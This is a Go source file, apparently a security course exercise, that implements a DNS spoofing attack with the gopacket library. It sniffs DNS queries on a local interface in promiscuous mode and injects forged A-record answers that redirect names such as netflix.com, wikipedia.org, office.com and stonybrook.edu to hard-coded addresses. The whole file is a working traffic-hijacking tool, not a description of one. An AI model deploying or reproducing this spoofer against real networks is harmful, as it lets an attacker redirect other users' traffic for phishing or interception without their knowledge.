package main

import (
	"fmt"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"log"
	"net"
	"regexp"
)

var (
	device    string = "enp0s3"	
	err       error
	handle    *pcap.Handle
	hostNames map[string]string
)

func populateHostName() {
	hostNames = make(map[string]string)
	hostNames["imdb.com"] = "192.168.100.4"
	hostNames["blackboard.com"] = "10.0.0.1"
	hostNames["spotify.org"] = "10.12.33.1"
	hostNames["whatsapp.com"] = "10.3.2.1"
	hostNames["stonybrook.edu"] = "10.3.2.2"
	hostNames["office.com"] = "10.3.2.3"
	hostNames["netflix.com"] = "10.3.2.4"
	hostNames["spotify.com"] = "10.3.2.5"
	hostNames["myshopify.com"] = "10.3.2.6"
	hostNames["wikipedia.org"] = "10.3.2.7"
}

func getSpoofedIP(s string) (string, bool) {
	for key, value := range hostNames {
		found, _ := regexp.MatchString(key, s)
		if found {
			return value, true
		}
	}
	return "", false
}

func getInterfaceIP(interfaceName string) net.IP {
	interfaces, err := net.Interfaces()
	if err != nil {
		fmt.Println("Error encountered during get Interfaces list:", err)
		panic(err)
	}

	for i := range interfaces {
		if interfaces[i].Name == interfaceName {
			addrs, err := interfaces[i].Addrs()
			if err != nil {
				fmt.Println("Error encountered during interface address reading:", err)
				panic(err)
			}

			if len(addrs) < 1 {
				panic("No address on the given interface")
			}

			ip, _, err := net.ParseCIDR(addrs[0].String())
			if err != nil {
				fmt.Println("Error encountered during parseCIDR:", err)
				panic(err)
			}
			return ip
		} else {
			continue;
		}		
	}
	return nil
}

func processDNSPackets() {
	var dnsLayer layers.DNS
	var ethLayer layers.Ethernet
	var ipv4Layer layers.IPv4
	var ipv6Layer layers.IPv6
	var payload gopacket.Payload
	var tcpLayer layers.TCP
	var udpLayer layers.UDP
	
	var qDNS layers.DNSQuestion
	var rrDNS layers.DNSResourceRecord

	var ethMac net.HardwareAddr
	var i uint16
	var ipv4Addr net.IP
	var ipv6Addr net.IP
	var isFound bool
	var udpPort layers.UDPPort
	var spoofedIP string

	outputBuffer := gopacket.NewSerializeBuffer()
	serialOptions := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}
	

	parser := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &ethLayer, &ipv4Layer, &ipv6Layer, &tcpLayer, &udpLayer, &dnsLayer, &payload)

	decodedLayers := make([]gopacket.LayerType, 0, 10)

	for true {
		rrDNS.Type = layers.DNSTypeA
		rrDNS.Class = layers.DNSClassIN
		rrDNS.TTL = 300
		rrDNS.IP = getInterfaceIP(device)
		data, _, err := handle.ZeroCopyReadPacketData()
		if err != nil {
			fmt.Println("Error reading packet data: ", err)
			continue
		}
		err = parser.DecodeLayers(data, &decodedLayers)
		if len(decodedLayers) != 4 {
			fmt.Println("Not enough layers!")
			continue
		}
		if dnsLayer.QR {
			continue
		}

		for _, typ := range decodedLayers {
			switch typ {
				case layers.LayerTypeEthernet:
					// swap ethernet macs
					ethMac = ethLayer.SrcMAC
					ethLayer.SrcMAC = ethLayer.DstMAC
					ethLayer.DstMAC = ethMac

				case layers.LayerTypeIPv4:
					// swap the ip
					ipv4Addr = ipv4Layer.SrcIP
					ipv4Layer.SrcIP = ipv4Layer.DstIP
					ipv4Layer.DstIP = ipv4Addr

				case layers.LayerTypeIPv6:
					// swap the ip
					ipv6Addr = ipv6Layer.SrcIP
					ipv6Layer.SrcIP = ipv6Layer.DstIP
					ipv6Layer.DstIP = ipv6Addr

				case layers.LayerTypeUDP:
					// swap the udp ports
					udpPort = udpLayer.SrcPort
					udpLayer.SrcPort = udpLayer.DstPort
					udpLayer.DstPort = udpPort

				case layers.LayerTypeDNS:
					dnsLayer.QR = true

					if dnsLayer.RD {
						dnsLayer.RA = true
					}

					for i = 0; i < dnsLayer.QDCount; i++ {
						qDNS = dnsLayer.Questions[i]

						// verify this is a valid record question
						if qDNS.Type != layers.DNSTypeA || qDNS.Class != layers.DNSClassIN {
							continue
						}

						rrDNS.Name = qDNS.Name
						spoofedIP, isFound = getSpoofedIP(string(qDNS.Name))
						rrDNS.IP = net.ParseIP(spoofedIP)

						if isFound {
							fmt.Println("\nNAME: ", string(qDNS.Name))
							fmt.Println("Spoofed IP: ", spoofedIP)
						}
						rrDNS.Name = qDNS.Name

						dnsLayer.Answers = append(dnsLayer.Answers, rrDNS)
						dnsLayer.ANCount++
					}
			}
		}
		if isFound {
			err = udpLayer.SetNetworkLayerForChecksum(&ipv4Layer)
			if err != nil {
				panic(err)
				fmt.Println("Error encountered during SetNetworkLayerForChecksum:", err)
			}

			err = gopacket.SerializeLayers(outputBuffer, serialOptions, &ethLayer, &ipv4Layer, &udpLayer, &dnsLayer)
			if err != nil {
				panic(err)
				fmt.Println("Error encountered during SerializeLayers:", err)
			}

			err = handle.WritePacketData(outputBuffer.Bytes())
			if err != nil {
				panic(err)
				fmt.Println("Error encountered during WritePacketData:", err)
			}

			fmt.Println("Response sent")
		}
	}
}

func main() {

	devices, err := pcap.FindAllDevs()

	device = devices[0].Name

	populateHostName()

	var filter string = "udp port 53"

	handle, err = pcap.OpenLive(device, 65535, true, pcap.BlockForever)

	if err != nil {
		panic(err)
		fmt.Println("Error encountered during pcap.OpenLive:", err)
	}

	fmt.Println(filter)
	log.Printf("Listening on default \"%s\" interface\n", device)

	defer handle.Close()

	err = handle.SetBPFFilter(filter)

	if err != nil {
		panic(err)
		fmt.Println("Error encountered during SetBPFFilter:", err)
	}

	processDNSPackets()
}
